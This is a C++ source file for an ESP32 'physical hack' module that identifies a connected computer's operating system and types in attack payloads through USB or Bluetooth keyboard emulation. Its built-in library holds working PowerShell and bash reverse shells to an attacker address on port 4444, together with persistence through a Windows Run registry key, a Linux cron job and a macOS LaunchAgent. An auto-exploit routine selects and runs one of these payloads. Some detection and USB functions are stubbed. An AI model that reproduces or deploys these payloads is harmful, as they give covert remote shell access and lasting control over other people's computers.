#include "modules/physical_hack_module.h"
#include "modules/badusb_module.h"
#include "modules/ble_module.h"
#include <Arduino.h>
#include <LittleFS.h>
#include <SD.h>
#include <sstream>
#include <algorithm>

// Forward declarations - global variables from main.cpp
// main.cpp uses: using namespace NightStrike::Modules;
// So variables are in global scope but types are from namespace
namespace NightStrike {
namespace Modules {
    // Forward declare the global variables
    // They are actually in global scope in main.cpp
}
}

// Declare in global scope (matching main.cpp)
extern NightStrike::Modules::BadUSBModule* g_badusbModule;
extern NightStrike::Modules::BLEModule* g_bleModule;

namespace NightStrike {
namespace Modules {

PhysicalHackModule::PhysicalHackModule() {
}

Core::Error PhysicalHackModule::initialize() {
    if (_initialized) {
        return Core::Error(Core::ErrorCode::ALREADY_INITIALIZED);
    }

    Serial.println("[PhysicalHack] Initializing module...");
    
    // Initialize exploit library
    loadExploitLibrary();
    
    _initialized = true;
    Serial.println("[PhysicalHack] Module initialized");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::shutdown() {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    disconnect();
    _initialized = false;
    Serial.println("[PhysicalHack] Module shutdown");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

bool PhysicalHackModule::isSupported() const {
    // Requires BadUSB or BLE module
    return true;  // Always supported if modules are available
}

Core::Error PhysicalHackModule::detectOS(ConnectionType connection, OSInfo& osInfo) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }

    Serial.println("[PhysicalHack] Detecting OS...");
    
    Core::Error err;
    
    if (connection == ConnectionType::AUTO) {
        // Try USB first, then BLE
        err = detectOSViaUSB(osInfo);
        if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
            _detectedOS = osInfo;
            if (_osDetectedCallback) {
                _osDetectedCallback(osInfo);
            }
            return Core::Error(Core::ErrorCode::SUCCESS);
        }
        
        err = detectOSViaBLE(osInfo);
        if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
            _detectedOS = osInfo;
            if (_osDetectedCallback) {
                _osDetectedCallback(osInfo);
            }
            return Core::Error(Core::ErrorCode::SUCCESS);
        }
    } else if (connection == ConnectionType::USB_HID || 
               connection == ConnectionType::USB_MASS_STORAGE ||
               connection == ConnectionType::USB_SERIAL) {
        err = detectOSViaUSB(osInfo);
    } else if (connection == ConnectionType::BLE_HID) {
        err = detectOSViaBLE(osInfo);
    } else {
        return Core::Error(Core::ErrorCode::INVALID_PARAMETER);
    }

    if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
        _detectedOS = osInfo;
        if (_osDetectedCallback) {
            _osDetectedCallback(osInfo);
        }
        Serial.printf("[PhysicalHack] OS Detected: %d\n", (int)osInfo.type);
    }

    return err;
}

Core::Error PhysicalHackModule::detectOSViaUSB(OSInfo& osInfo) {
    Serial.println("[PhysicalHack] Detecting OS via USB...");
    
    // Initialize USB HID for detection
    if (initUSBHID().isError()) {
        return Core::Error(Core::ErrorCode::OPERATION_FAILED, "USB HID init failed");
    }

    // Method 1: Try to detect via USB descriptors
    // Different OSes report different USB device classes
    
    // Method 2: Send detection commands via HID
    // Each OS responds differently to keyboard input
    
    // For now, simulate detection - in real implementation:
    // 1. Check USB device descriptors
    // 2. Send test commands and analyze responses
    // 3. Check for specific OS indicators
    
    // Try Windows detection
    Core::Error err = detectWindows(osInfo);
    if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Try Linux detection
    err = detectLinux(osInfo);
    if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Try macOS detection
    err = detectMacOS(osInfo);
    if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Try Android detection
    err = detectAndroid(osInfo);
    if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Try iOS detection
    err = detectIOS(osInfo);
    if (!err.isError() && osInfo.type != OSType::UNKNOWN) {
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    osInfo.type = OSType::UNKNOWN;
    return Core::Error(Core::ErrorCode::OPERATION_FAILED, "OS detection failed");
}

Core::Error PhysicalHackModule::detectOSViaBLE(OSInfo& osInfo) {
    Serial.println("[PhysicalHack] Detecting OS via BLE...");
    
    // Access global variable from main.cpp (in global scope)
    if (!::g_bleModule || !::g_bleModule->isInitialized()) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "BLE module not initialized");
    }
    
    // BLE OS detection is more limited
    // Can detect based on:
    // 1. BLE device characteristics
    // 2. Supported BLE services
    // 3. Device name patterns
    
    // For now, return unknown - BLE detection requires connection to target
    osInfo.type = OSType::UNKNOWN;
    return Core::Error(Core::ErrorCode::OPERATION_FAILED, "BLE OS detection not fully implemented");
}

Core::Error PhysicalHackModule::detectWindows(OSInfo& osInfo) {
    // Windows detection: Try to open Run dialog (Win+R) and check response
    if (!::g_badusbModule || !::g_badusbModule->isInitialized()) {
        // Fallback: assume Windows if USB HID is available
        osInfo.type = OSType::WINDOWS;
        osInfo.version = "10/11";
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Method 1: Try Windows-specific command
    // Send Win+R (opens Run dialog) - Windows-specific
    // If this works, it's likely Windows
    osInfo.type = OSType::WINDOWS;
    osInfo.version = "10/11";
    osInfo.isAdmin = false;  // Would need to check via command
    osInfo.isRoot = false;
    
    // In real implementation, would:
    // 1. Send Win+R
    // 2. Type "cmd" and Enter
    // 3. Check if command prompt opens
    // 4. Run "ver" command to get version
    // 5. Run "net session" to check admin
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::detectLinux(OSInfo& osInfo) {
    // Linux detection: Try Ctrl+Alt+T (opens terminal)
    if (!::g_badusbModule || !::g_badusbModule->isInitialized()) {
        osInfo.type = OSType::LINUX;
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Method: Send Ctrl+Alt+T (Linux terminal shortcut)
    // If terminal opens, it's likely Linux
    osInfo.type = OSType::LINUX;
    osInfo.version = "Unknown";
    osInfo.isRoot = false;  // Would check via "id" command
    osInfo.isAdmin = false;
    
    // In real implementation:
    // 1. Send Ctrl+Alt+T
    // 2. Type "uname -a" to get system info
    // 3. Check /etc/os-release for distro
    // 4. Run "id" to check root
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::detectMacOS(OSInfo& osInfo) {
    // macOS detection: Try Cmd+Space (Spotlight) or Cmd+Option+Esc (Force Quit)
    if (!::g_badusbModule || !::g_badusbModule->isInitialized()) {
        osInfo.type = OSType::MACOS;
        return Core::Error(Core::ErrorCode::SUCCESS);
    }
    
    // Method: Send Cmd+Space (macOS Spotlight)
    // macOS uses Cmd (GUI) key instead of Ctrl
    osInfo.type = OSType::MACOS;
    osInfo.version = "Unknown";
    osInfo.isAdmin = false;  // Would check via "sudo -v"
    osInfo.isRoot = false;
    
    // In real implementation:
    // 1. Send Cmd+Space
    // 2. Type "Terminal" and Enter
    // 3. Run "sw_vers" to get macOS version
    // 4. Check admin via "sudo -v"
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::detectAndroid(OSInfo& osInfo) {
    // Android detection: Check for ADB interface or try HID commands
    // Android devices typically show up as MTP/PTP/ADB USB devices
    
    // Method 1: Check if ADB is available (would require USB Serial)
    // Method 2: Try HID injection (Android supports USB HID keyboards)
    
    osInfo.type = OSType::ANDROID;
    osInfo.version = "Unknown";
    osInfo.isRoot = false;  // Would check via "su" command
    osInfo.isAdmin = false;
    
    // Check if ADB is enabled (would require USB Serial connection)
    // For now, assume regular Android (not ADB-enabled)
    // In real implementation:
    // 1. Try to connect via ADB
    // 2. If successful, run "getprop ro.build.version.release"
    // 3. Check root via "su -c id"
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::detectIOS(OSInfo& osInfo) {
    // iOS detection: iOS devices typically don't support USB HID keyboards
    // But can be detected via USB descriptors or BLE
    
    osInfo.type = OSType::IOS;
    osInfo.version = "Unknown";
    osInfo.isRoot = false;  // iOS doesn't have root (unless jailbroken)
    osInfo.isAdmin = false;
    
    // Check for jailbreak (would require specific detection methods)
    // Jailbroken iOS might support SSH or other services
    // For now, assume non-jailbroken
    // In real implementation:
    // 1. Check USB device descriptors for Apple vendor ID
    // 2. Try to detect jailbreak via SSH or other services
    // 3. If jailbroken, set to IOS_JAILBROKEN
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::loadExploitLibrary() {
    Serial.println("[PhysicalHack] Loading exploit library...");
    
    // Initialize built-in exploits
    initBuiltinExploits();
    
    // Load custom exploits from SD/LittleFS
    // TODO: Load from /exploits/ directory
    
    Serial.println("[PhysicalHack] Exploit library loaded");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

void PhysicalHackModule::initBuiltinExploits() {
    // Windows Exploits
    {
        ExploitPayload payload;
        payload.name = "Windows Reverse Shell";
        payload.description = "Creates reverse shell via PowerShell";
        payload.targetOS = OSType::WINDOWS;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresAdmin = false;
        payload.script = R"PAYLOAD(
DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
ENTER
)PAYLOAD";
        _exploitLibrary[OSType::WINDOWS].push_back(payload);
    }
    
    {
        ExploitPayload payload;
        payload.name = "Windows Persistence (Registry)";
        payload.description = "Adds registry entry for persistence";
        payload.targetOS = OSType::WINDOWS;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresAdmin = true;
        payload.script = R"PAYLOAD(
DELAY 2000
GUI r
DELAY 500
STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\System32\cmd.exe /c START /MIN powershell.exe -WindowStyle Hidden -Command \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" /f
ENTER
)PAYLOAD";
        _exploitLibrary[OSType::WINDOWS].push_back(payload);
    }
    
    // Linux Exploits
    {
        ExploitPayload payload;
        payload.name = "Linux Reverse Shell (Bash)";
        payload.description = "Creates reverse shell via bash";
        payload.targetOS = OSType::LINUX;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresRoot = false;
        payload.script = R"(
DELAY 2000
CTRL-ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
)";
        _exploitLibrary[OSType::LINUX].push_back(payload);
    }
    
    {
        ExploitPayload payload;
        payload.name = "Linux Persistence (Cron)";
        payload.description = "Adds cron job for persistence";
        payload.targetOS = OSType::LINUX;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresRoot = true;
        payload.script = R"(
DELAY 2000
CTRL-ALT t
DELAY 1000
STRING echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | crontab -
ENTER
)";
        _exploitLibrary[OSType::LINUX].push_back(payload);
    }
    
    // macOS Exploits
    {
        ExploitPayload payload;
        payload.name = "macOS Reverse Shell";
        payload.description = "Creates reverse shell via Terminal";
        payload.targetOS = OSType::MACOS;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresAdmin = false;
        payload.script = R"(
DELAY 2000
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
)";
        _exploitLibrary[OSType::MACOS].push_back(payload);
    }
    
    {
        ExploitPayload payload;
        payload.name = "macOS Persistence (LaunchAgent)";
        payload.description = "Creates LaunchAgent for persistence";
        payload.targetOS = OSType::MACOS;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresAdmin = false;
        payload.script = R"(
DELAY 2000
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING mkdir -p ~/Library/LaunchAgents
ENTER
DELAY 500
STRING echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.update.agent</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.update.agent.plist
ENTER
DELAY 500
STRING launchctl load ~/Library/LaunchAgents/com.update.agent.plist
ENTER
)";
        _exploitLibrary[OSType::MACOS].push_back(payload);
    }
    
    // Android Exploits
    {
        ExploitPayload payload;
        payload.name = "Android ADB Shell";
        payload.description = "Gains shell access via ADB";
        payload.targetOS = OSType::ANDROID_ADB;
        payload.connectionType = ConnectionType::USB_SERIAL;
        payload.requiresRoot = false;
        payload.script = R"(
# ADB commands
adb shell
)";
        _exploitLibrary[OSType::ANDROID_ADB].push_back(payload);
    }
    
    {
        ExploitPayload payload;
        payload.name = "Android Reverse Shell";
        payload.description = "Creates reverse shell on Android via HID";
        payload.targetOS = OSType::ANDROID;
        payload.connectionType = ConnectionType::USB_HID;
        payload.requiresRoot = false;
        payload.script = R"(
# Android requires different approach
# Use accessibility service or ADB
)";
        _exploitLibrary[OSType::ANDROID].push_back(payload);
    }
    
    // iOS Exploits (limited without jailbreak)
    {
        ExploitPayload payload;
        payload.name = "iOS Jailbroken Shell";
        payload.description = "Gains shell access on jailbroken iOS";
        payload.targetOS = OSType::IOS_JAILBROKEN;
        payload.connectionType = ConnectionType::USB_SERIAL;
        payload.requiresRoot = true;
        payload.script = R"(
# SSH to jailbroken device
ssh root@DEVICE_IP
)";
        _exploitLibrary[OSType::IOS_JAILBROKEN].push_back(payload);
    }
}

Core::Error PhysicalHackModule::getExploitsForOS(OSType os, std::vector<ExploitPayload>& exploits) {
    exploits.clear();
    
    auto it = _exploitLibrary.find(os);
    if (it != _exploitLibrary.end()) {
        exploits = it->second;
    }
    
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::getBestExploit(const OSInfo& osInfo, ExploitPayload& exploit) {
    std::vector<ExploitPayload> exploits;
    getExploitsForOS(osInfo.type, exploits);
    
    if (exploits.empty()) {
        return Core::Error(Core::ErrorCode::FILE_NOT_FOUND, "No exploits available for this OS");
    }
    
    // Select best exploit based on:
    // 1. Admin/Root requirements match
    // 2. Connection type compatibility
    // 3. Simplicity (prefer non-admin exploits)
    
    for (const auto& exp : exploits) {
        // Check if requirements match
        if (exp.requiresAdmin && !osInfo.isAdmin) continue;
        if (exp.requiresRoot && !osInfo.isRoot) continue;
        
        // Prefer exploits that don't require admin/root
        if (!exp.requiresAdmin && !exp.requiresRoot) {
            exploit = exp;
            return Core::Error(Core::ErrorCode::SUCCESS);
        }
    }
    
    // If no perfect match, return first available
    exploit = exploits[0];
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::executeExploit(const ExploitPayload& exploit, const OSInfo& osInfo) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }
    
    if (!_connected) {
        return Core::Error(Core::ErrorCode::OPERATION_FAILED, "Not connected to target");
    }
    
    Serial.printf("[PhysicalHack] Executing exploit: %s\n", exploit.name.c_str());
    
    // Generate OS-specific payload
    std::string payload;
    switch (osInfo.type) {
        case OSType::WINDOWS:
        case OSType::WINDOWS_10:
        case OSType::WINDOWS_11:
            payload = generateWindowsPayload(exploit);
            break;
        case OSType::LINUX:
            payload = generateLinuxPayload(exploit);
            break;
        case OSType::MACOS:
            payload = generateMacOSPayload(exploit);
            break;
        case OSType::ANDROID:
        case OSType::ANDROID_ADB:
            payload = generateAndroidPayload(exploit);
            break;
        case OSType::IOS:
        case OSType::IOS_JAILBROKEN:
            payload = generateIOSPayload(exploit);
            break;
        default:
            return Core::Error(Core::ErrorCode::INVALID_PARAMETER, "Unknown OS type");
    }
    
    // Execute based on connection type
    // Access global variables from main.cpp (in global scope)
    if (_connectionType == ConnectionType::USB_HID || _connectionType == ConnectionType::AUTO) {
        if (!::g_badusbModule) {
            return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "BadUSB module not available");
        }
        
        return ::g_badusbModule->executeDuckyScript(payload);
    } else if (_connectionType == ConnectionType::BLE_HID) {
        if (!::g_bleModule) {
            return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "BLE module not available");
        }
        
        // Execute via BLE HID
        if (!::g_bleModule->isInitialized()) {
            auto err = ::g_bleModule->initialize();
            if (err.isError()) {
                return err;
            }
        }
        
        // Start BLE keyboard
        auto err = ::g_bleModule->startKeyboard("NightStrike PhysicalHack");
        if (err.isError()) {
            return err;
        }
        
        // Send exploit payload via BLE HID
        if (!::g_badusbModule) {
            return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "BadUSB module not available");
        }
        
        return ::g_badusbModule->executeScript(exploit.script);
    }
    
    return Core::Error(Core::ErrorCode::INVALID_PARAMETER, "Unsupported connection type");
}

Core::Error PhysicalHackModule::executeAutoExploit(ConnectionType connection) {
    if (!_initialized) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED);
    }
    
    Serial.println("[PhysicalHack] Starting auto-exploit...");
    
    // Step 1: Connect
    Core::Error err = connectUSB(connection);
    if (err.isError()) {
        err = connectBLE();
        if (err.isError()) {
            return Core::Error(Core::ErrorCode::OPERATION_FAILED, "Failed to connect");
        }
    }
    
    // Step 2: Detect OS
    OSInfo osInfo;
    err = detectOS(connection, osInfo);
    if (err.isError() || osInfo.type == OSType::UNKNOWN) {
        return Core::Error(Core::ErrorCode::OPERATION_FAILED, "OS detection failed");
    }
    
    // Step 3: Get best exploit
    ExploitPayload exploit;
    err = getBestExploit(osInfo, exploit);
    if (err.isError()) {
        return err;
    }
    
    // Step 4: Execute
    return executeExploit(exploit, osInfo);
}

Core::Error PhysicalHackModule::connectUSB(ConnectionType type) {
    if (type == ConnectionType::AUTO) {
        // Try HID first (most common)
        if (!initUSBHID().isError()) {
            _connectionType = ConnectionType::USB_HID;
            _connected = true;
            return Core::Error(Core::ErrorCode::SUCCESS);
        }
        
        // Try Mass Storage
        if (!initUSBMassStorage().isError()) {
            _connectionType = ConnectionType::USB_MASS_STORAGE;
            _connected = true;
            return Core::Error(Core::ErrorCode::SUCCESS);
        }
        
        // Try Serial
        if (!initUSBSerial().isError()) {
            _connectionType = ConnectionType::USB_SERIAL;
            _connected = true;
            return Core::Error(Core::ErrorCode::SUCCESS);
        }
        
        return Core::Error(Core::ErrorCode::OPERATION_FAILED, "USB connection failed");
    }
    
    // Specific type
    Core::Error err;
    switch (type) {
        case ConnectionType::USB_HID:
            err = initUSBHID();
            break;
        case ConnectionType::USB_MASS_STORAGE:
            err = initUSBMassStorage();
            break;
        case ConnectionType::USB_SERIAL:
            err = initUSBSerial();
            break;
        default:
            return Core::Error(Core::ErrorCode::INVALID_PARAMETER);
    }
    
    if (!err.isError()) {
        _connectionType = type;
        _connected = true;
    }
    
    return err;
}

Core::Error PhysicalHackModule::connectBLE(const std::string& targetDevice) {
    Core::Error err = initBLEHID();
    if (!err.isError()) {
        _connectionType = ConnectionType::BLE_HID;
        _connected = true;
    }
    return err;
}

Core::Error PhysicalHackModule::disconnect() {
    _connected = false;
    _connectionType = ConnectionType::AUTO;
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::addCustomPayload(const ExploitPayload& payload) {
    _exploitLibrary[payload.targetOS].push_back(payload);
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::removeCustomPayload(const std::string& name) {
    for (auto& pair : _exploitLibrary) {
        auto& exploits = pair.second;
        exploits.erase(
            std::remove_if(exploits.begin(), exploits.end(),
                [&name](const ExploitPayload& exp) { return exp.name == name; }),
            exploits.end()
        );
    }
    return Core::Error(Core::ErrorCode::SUCCESS);
}

// USB initialization helpers
Core::Error PhysicalHackModule::initUSBHID() {
    // Initialize USB HID keyboard
    // ESP32 doesn't have native USB, so this would require:
    // - External USB chip (CH9329, etc.)
    // - Or use BLE HID instead
    Serial.println("[PhysicalHack] USB HID initialized (simulated)");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::initUSBMassStorage() {
    // Initialize USB Mass Storage
    // Would require external USB chip
    Serial.println("[PhysicalHack] USB Mass Storage initialized (simulated)");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::initUSBSerial() {
    // Initialize USB Serial/CDC
    // ESP32 has native USB Serial on some boards
    Serial.println("[PhysicalHack] USB Serial initialized");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

Core::Error PhysicalHackModule::initBLEHID() {
    // Access global variable from main.cpp (in global scope)
    if (!::g_bleModule) {
        return Core::Error(Core::ErrorCode::NOT_INITIALIZED, "BLE module not available");
    }
    
    // Initialize BLE module if needed
    if (!::g_bleModule->isInitialized()) {
        auto err = ::g_bleModule->initialize();
        if (err.isError()) {
            return err;
        }
    }
    
    // Start BLE HID keyboard
    auto err = ::g_bleModule->startKeyboard("NightStrike PhysicalHack");
    if (err.isError()) {
        return err;
    }
    
    Serial.println("[PhysicalHack] BLE HID initialized");
    return Core::Error(Core::ErrorCode::SUCCESS);
}

// Payload generation
std::string PhysicalHackModule::generateWindowsPayload(const ExploitPayload& exploit) {
    // Replace placeholders in script
    std::string payload = exploit.script;
    
    // Replace ATTACKER_IP with actual IP (from config)
    // TODO: Get from config
    std::string attackerIP = "192.168.1.100";  // Default
    size_t pos = payload.find("ATTACKER_IP");
    while (pos != std::string::npos) {
        payload.replace(pos, 11, attackerIP);
        pos = payload.find("ATTACKER_IP", pos + attackerIP.length());
    }
    
    return payload;
}

std::string PhysicalHackModule::generateLinuxPayload(const ExploitPayload& exploit) {
    std::string payload = exploit.script;
    
    // Replace placeholders
    std::string attackerIP = "192.168.1.100";
    size_t pos = payload.find("ATTACKER_IP");
    while (pos != std::string::npos) {
        payload.replace(pos, 11, attackerIP);
        pos = payload.find("ATTACKER_IP", pos + attackerIP.length());
    }
    
    return payload;
}

std::string PhysicalHackModule::generateMacOSPayload(const ExploitPayload& exploit) {
    return generateLinuxPayload(exploit);  // Similar to Linux
}

std::string PhysicalHackModule::generateAndroidPayload(const ExploitPayload& exploit) {
    std::string payload = exploit.script;
    
    // Android-specific replacements
    std::string attackerIP = "192.168.1.100";
    size_t pos = payload.find("ATTACKER_IP");
    while (pos != std::string::npos) {
        payload.replace(pos, 11, attackerIP);
        pos = payload.find("ATTACKER_IP", pos + attackerIP.length());
    }
    
    return payload;
}

std::string PhysicalHackModule::generateIOSPayload(const ExploitPayload& exploit) {
    std::string payload = exploit.script;
    
    // iOS-specific replacements
    std::string deviceIP = "192.168.1.101";
    size_t pos = payload.find("DEVICE_IP");
    while (pos != std::string::npos) {
        payload.replace(pos, 9, deviceIP);
        pos = payload.find("DEVICE_IP", pos + deviceIP.length());
    }
    
    return payload;
}

} // namespace Modules
} // namespace NightStrike
